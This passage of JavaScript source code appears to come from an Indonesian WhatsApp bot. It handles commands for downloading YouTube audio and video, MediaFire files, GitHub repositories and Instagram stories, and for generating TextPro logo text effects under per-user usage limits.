if(q.includes("https://youtu.be/")){
var videoId = q.replace('https://youtu.be/', '')
} else if(q.includes("https://youtube.com/watch?v=")){
var videoId = q.split('=')[1]
} else if(q.includes("https://youtube.com/shorts/")){
var videoId = q.replace('https://youtube.com/shorts/', '')
}  else {
return setReply("Link salah")
}
let link =`https://youtube.com/watch?v=${videoId}` 
let anu = await yts(link)
if(anu.all.length == "0") return setReply("Musik tidak di temukan")
try{
var foto = `https://i.ytimg.com/vi/${videoId}/hqdefault.jpg`
} catch (err){
var foto = anu.all[0].image
} 
try{
let info = await ytdl.getInfo(link);
let format = ytdl.filterFormats(info.formats, 'audioonly');
if(Number(format.contentLength) > 20000000 ) return setReply(`Bjir sizenya ${FileSize(format.contentLength)}\nAu ah ga mao download 😤`)

let teks =`*YOUTUBE AUDIO DOWNLOADER*

📂 Title : ${info.videoDetails.title}
📄 Size : ${FileSize(format[0].contentLength)}
🆔 ID : ${videoId}
⏲️ Duration : ${anu.all[0].timestamp}
📊 Viewers : ${h2k(anu.all[0].views)}
🌐 Upload At : ${anu.all[0].ago}
🔖 Author : ${anu.all[0].author.name}
👤 Channel : ${anu.all[0].author.url}
🔗 Url : ${anu.all[0].url}
📝 Description : ${anu.all[0].description}`
await xdev.sendMessage(from, {image: {url: foto}, caption: teks},{quoted: setQuoted})
downloadMp3(q) 
} catch(err){
setReply(err)
}
}
break
case 'ytmp4':
try{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (q.includes("https://youtube.com/channel/")) return setReply("Goblok itu bukan link vidio bangsat")
setReply("*Scrapping...*")
if(q.includes("https://youtu.be/")){
var videoId = q.replace('https://youtu.be/', '')
} else if(q.includes("https://youtube.com/watch?v=")){
var videoId = q.split('=')[1]
} else if(q.includes("https://youtube.com/shorts/")){
var videoId = q.replace('https://youtube.com/shorts/', '')
}  else {
return setReply("Link salah")
}
let link =`https://youtube.com/watch?v=${videoId}`
let anu = await yts(link)
if(anu.all.length == "0") return setReply("Video tidak di temukan")
let info = await ytdl.getInfo(link);
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
if(Number(format.contentLength) > 40000000 ) return setReply(`Bjir sizenya ${FileSize(format.contentLength)}\nAu ah ga mao download 😤`)

let teks =`*YOUTUBE VIDEO DOWNLOADER*

📂 Title : ${anu.all[0].title}
💾 Ext : 360p
📄 Size : ${FileSize(format.contentLength)}
🆔 ID : ${videoId}
⏲️ Duration : ${anu.all[0].timestamp}
🌎 Viewers : ${h2k(anu.all[0].views)}
🌐 Upload At : ${anu.all[0].ago}
🔖 Author : ${anu.all[0].author.name}
📹 Channel : ${anu.all[0].author.url}
🔗 Url : ${anu.all[0].url}
📝 Description : ${anu.all[0].description}`
await xdev.sendMessage(from, {image: {url: anu.all[0].image}, caption: teks},{quoted: setQuoted})
downloadMp4(q) 
} catch(err){
setReply(`${err}`)
}
break 
case 'mediafire':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(q.startsWith("https://www.mediafire.com")){
let nana = await mediafiredl(q)
if(nana.filename == "") return setReply("Error itu bukan file, kalo ga tau cara make mediafire mending ga usah make") 
console.log(nana)
let tuks =`
Data succesfull obtained

File Name : ${nana.filename}
File Size : ${nana.filesizeH}
Upload : ${nana.aploud}
`
await setReply(tuks)
if(nana.filesize > 50000 && !isOwner){
if(sender.startsWith("62")){
let tuks = "Kamu telah di banned\nkarena menyalah gunakan\nfitur mediafire!"
} else {
let tuks = "You have been banned\nfor abusing the mediafire feature"
}
addBanned(pushname,calender, senderNumber, ban) 
await setReply("File size melebihi batas,\nbatas yang di tentukan adalah 50mb")              
await setReply(tuks)
return
}
await xdev.sendMedia (from, nana.url, setQuoted, {fileName: nana.filename})
} else{
setReply("Link Invalid")
}
}
break  
case 'githubdl':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!q.includes("|")) return setReply(`Contoh ${prefix}${command}githubdl username|repository`)    
let url = `https://github.com/${q.split("|")[0]}/${q.split("|")[1]}/archive/refs/heads/master.zip`
//ByRizkyAdi
console.log("Done")
setReply(`Waiting for compress to zip`)
await xdev.sendMedia (from, url, setQuoted, {fileName: q.split("|")[1]})
}
break  
case 'gitclone':
try{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!q) return setReply( 'link githubnya mana? contoh: https://github.com/saipulanuar/v18 ')
if (!regex.test(q)) return setReply('link salah!')
let [, user, repos] = q.match(regex) || []
let repo = repos.replace(/.git$/, '')
let url = `https://api.github.com/repos/${user}/${repos}/zipball`
let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
// 'attachment; filename=ilmanhdyt/ShiraoriBOT-Mdv2.5.1-251-g836cccd.zip'
setReply(`*Mohon tunggu, sedang mengirim repository..*`)
await xdev.sendMedia (from, url, setQuoted, {fileName: filename})
} catch (err){
setReply(mess.error.link)
}
break  
case 'igstory': {
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!q) return setReply('Usernamenya?')      
Download.insta_story(q).then(async (data) => {
console.log(data.stories)
for(let i of data.stories){
if(i.type == 'photo'){
await xdev.sendMedia (from, i.url, setQuoted, {caption: "Nih"})
} else if(i.type == 'video'){
await xdev.sendMedia (from, i.url, setQuoted, {caption: "Nih"})
}
}
})
}
break  
//━━━━━━━━━━━━━━━[ TEXT PRO ]━━━━━━━━━━━━━━━━━// 
case 'blackping':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/create-blackpink-logo-style-online-1001.html", [`${q}`,])
.then((data) => xdev.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
case 'glitch':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/create-impressive-glitch-text-effects-online-1027.html", [
`${q}`,])
.then((data) => xdev.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break	
case 'glitch2':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
let teks1 = q.split("|")[0]
let teks2 = q.split("|")[1]
textpro("https://textpro.me/create-a-glitch-text-effect-online-free-1026.html", [
`${teks1}`,`${teks2}`])
.then((data) => xdev.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break	
case 'glitch3':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
let teks1 = q.split("|")[0]
let teks2 = q.split("|")[1]
textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
`${teks1}`,`${teks2}`])
.then((data) => xdev.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
case 'lion':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
let teks1 = q.split("|")[0]
let teks2 = q.split("|")[1]
textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
`${teks1}`,`${teks2}`])
.then((data) => xdev.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
case '3dspace':
{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
let teks1 = q.split("|")[0]
let teks2 = q.split("|")[1]
textpro("https://textpro.me/create-space-3d-text-effect-online-985.html", [
`${teks1}`,`${teks2}`])
.then((data) => xdev.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break		
case '3dneon':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/create-3d-neon-light-text-effect-online-1028.html", [
`${q}`,])
.then((data) => xdev.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break
case 'neon':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/neon-text-effect-online-879.html", [
`${q}`,])
.then((data) => xdev.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break
case 'greenneon':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/green-neon-text-effect-874.html", [
`${q}`,])
.then((data) => xdev.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break   
case 'bokeh':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/bokeh-text-effect-876.html", [
`${q}`,])
.then((data) => xdev.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break  
case 'hollographic':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/holographic-3d-text-effect-975.html", [
`${q}`,])
.then((data) => xdev.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break	
case 'bear':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
let teks1 = q.split("|")[0]
let teks2 = q.split("|")[1]
textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html", [
`${teks1}`,`${teks2}`])
.then((data) => xdev.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break		
case 'wolf':
{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
let teks1 = q.split("|")[0]
let teks2 = q.split("|")[1]
textpro("https://textpro.me/create-wolf-logo-galaxy-online-936.html", [
`${teks1}`,`${teks2}`])
.then((data) => xdev.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break		
case 'joker':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/create-logo-joker-online-934.html", [
`${q}`,])
.then((data) => xdev.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break	
case 'dropwater':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/dropwater-text-effect-872.html", [
`${q}`,])
.then((data) => xdev.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break
case 'neonlight':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/neon-light-text-effect-with-galaxy-style-981.html", [
`${q}`,])
.then((data) => xdev.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break
case 'thewall':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/break-wall-text-effect-871.html", [
`${q}`,])
.then((data) => xdev.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break
case 'natural':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/natural-leaves-text-effect-931.html", [
`${q}`,])
.then((data) => xdev.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break
case 'carbon':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/carbon-text-effect-833.html", [
`${q}`,])
.then((data) => xdev.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break
case 'pencil':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html", [
`${q}`,])
.then((data) => xdev.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break
case 'luxury':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/create-a-3d-luxury-metallic-text-effect-for-free-1071.html", [`${q}`,])
.then((data) => xdev.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
case 'whitegold':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/elegant-white-gold-3d-text-effect-online-free-1070.html", [`${q}`,])
.then((data) => xdev.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
case 'lightglow':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait() 
textpro("https://textpro.me/create-light-glow-sliced-text-effect-online-1068.html", [`${q}`,])
.then((data) => xdev.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
case 'arcane':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/create-text-effects-arcane-tv-series-online-1067.html", [`${q}`,])
.then((data) => xdev.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
case 'neonlight':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/neon-light-glitch-text-generator-online-1063.html", [`${q}`,])
.then((data) => xdev.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
